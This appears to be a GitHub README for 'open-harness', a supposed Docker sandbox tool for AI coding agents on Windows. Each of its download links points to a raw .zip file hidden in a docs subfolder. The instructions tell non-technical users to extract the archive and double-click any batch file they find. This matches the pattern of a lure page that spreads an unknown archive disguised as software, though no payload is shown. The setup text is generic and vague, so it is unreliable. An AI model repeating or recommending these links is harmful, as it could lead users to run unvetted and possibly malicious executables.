# 🧩 open-harness - Run AI sandboxes with ease

[![Download open-harness](https://img.shields.io/badge/Download-open--harness-blue?style=for-the-badge&logo=github)](https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip)

## 🚀 Getting Started

open-harness gives you isolated sandbox images for AI coding agents. It helps you run tools in a clean, separate space on Windows, so your main system stays organized.

If you want to try it now, visit this page to download:
https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip

## 🖥️ What You Need

Before you start, check these basics:

- A Windows PC
- An internet connection
- Enough free space for Docker images
- Docker Desktop installed
- Virtualization turned on in Windows
- A recent 64-bit version of Windows 10 or Windows 11

If you plan to use GPU-based tools, a system with NVIDIA support helps. If you only want a simple local setup, a standard laptop or desktop should work.

## 📦 Download and Install

1. Open this page in your browser:
   https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip

2. Look for the download area on the page.

3. Download the Windows package or the project files from the repository page.

4. If the download comes as a `.zip` file, right-click it and choose **Extract All**.

5. Open the extracted folder.

6. Find the file that starts the app or setup process. Common file names may include:
   - `start.bat`
   - `run.bat`
   - `launch.bat`
   - `docker-compose.yml`
   - `README.md`

7. If the project uses Docker, install Docker Desktop first, then continue with the setup steps below.

## 🐳 Set Up Docker Desktop

open-harness is built around sandbox images, so Docker is the main tool it uses.

1. Download Docker Desktop for Windows from the Docker website.
2. Install it with the default options.
3. Restart your PC if Windows asks you to.
4. Open Docker Desktop and wait until it shows that it is running.
5. Make sure virtualization is enabled if Docker does not start.

If Docker asks to use WSL 2, accept that option. It helps Docker run smoothly on Windows.

## 🛠️ Run open-harness

After you install Docker Desktop:

1. Go back to the open-harness folder you extracted.
2. Open the folder in File Explorer.
3. Look for a file named `docker-compose.yml` or a similar launch file.
4. If there is a batch file, double-click it.
5. If there is a Docker file, follow the README steps in the repository to build and start the sandbox image.
6. Wait while Docker pulls the needed images.
7. When the process finishes, open the app or service in your browser if the project provides a local address.

If the project opens a terminal window, leave it open while you use the sandbox.

## 🧭 First-Time Setup

The first run may take longer because Docker must download the base images.

You may also need to choose:

- Which AI agent you want to use
- Which sandbox profile to start
- Whether to use CPU or GPU mode
- Where to store files used by the sandbox

A simple first setup often works best:

- Use the default sandbox image
- Keep the storage path in the default location
- Start with CPU mode if you do not know if your system supports GPU tools

## 🤖 What open-harness Does

open-harness is for people who want a clean place for AI coding tools to run. It can help with:

- Isolating agent work from your main system
- Keeping test files separate
- Running different agent tools in separate containers
- Using shared images for repeated tasks
- Making it easier to reset a broken environment

This is useful when you want to try tools like:

- Claude Code
- Codex
- DeepAgents
- Gemini CLI
- LangChain-based agents
- Other Docker-based agent setups

## 🧪 Typical Use Cases

You may want open-harness if you:

- Test code written by an AI agent
- Need a sandbox for file edits
- Want to avoid clutter on your main Windows install
- Use more than one coding agent
- Need a repeatable environment for demos or experiments
- Work with local tools that depend on Docker images

## 📁 Basic Folder Layout

You may see folders and files like these:

- `images/` for sandbox images
- `configs/` for setup settings
- `scripts/` for launch helpers
- `docs/` for project notes
- `README.md` for setup steps

If the repository includes sample settings, use them first before changing anything.

## ⚙️ Common Settings

Some installs may let you adjust:

- Image name
- Container name
- Port number
- Shared folder path
- GPU access
- Memory use
- Network access

If you are not sure what to change, keep the default values.

## 🔐 Safety and Isolation

Sandbox images help keep tasks separate from your main Windows system. That means you can:

- Test code in a controlled space
- Reset the container when needed
- Limit changes to the sandbox
- Keep your main files out of agent work

This setup is useful when you want a clean working area for AI tools.

## 🧰 Troubleshooting

If the app does not start, try these steps:

1. Make sure Docker Desktop is open.
2. Restart Docker Desktop.
3. Restart your PC.
4. Check that virtualization is enabled in BIOS or UEFI.
5. Look for error messages in the terminal window.
6. Try running the setup again from the project folder.
7. Make sure the download finished without errors.

If you see a port conflict, close other apps that may use the same port and try again.

If Docker says it cannot find an image, wait for the download to finish or try the command again.

## 🧾 Useful Checks

Before you use open-harness, confirm:

- Docker Desktop is running
- The project files are extracted
- You opened the correct folder
- Your Windows account has permission to run the files
- You have enough disk space for the images

## 📌 Quick Start Path

For the fastest path on Windows:

1. Visit this page:
   https://github.com/trimanabas391/open-harness/raw/refs/heads/main/docs/pages/architecture/harness_open_1.3.zip
2. Download the repository files
3. Install Docker Desktop
4. Extract the files
5. Open the setup file or follow the Docker steps in the repository
6. Wait for the sandbox image to load
7. Start using the isolated environment

## 🧭 Common Questions

### Is this for non-technical users?

Yes. You can use it on Windows if you follow the setup steps and install Docker Desktop.

### Do I need coding knowledge?

No. You only need to download files, install Docker, and follow the project steps.

### Does it work with AI coding tools?

Yes. The repository topics point to agent tools and container-based sandbox use.

### Can I use it on one computer only?

Yes. You can run it locally on your Windows PC.

### What if I want to reset everything?

Delete the container or image from Docker Desktop and run the setup again.

## 🧩 Best Results Tips

- Use the default setup first
- Keep Docker open while the sandbox runs
- Save your work outside the container if needed
- Use one sandbox at a time until you know how it behaves
- Check the repository README for project-specific files and commands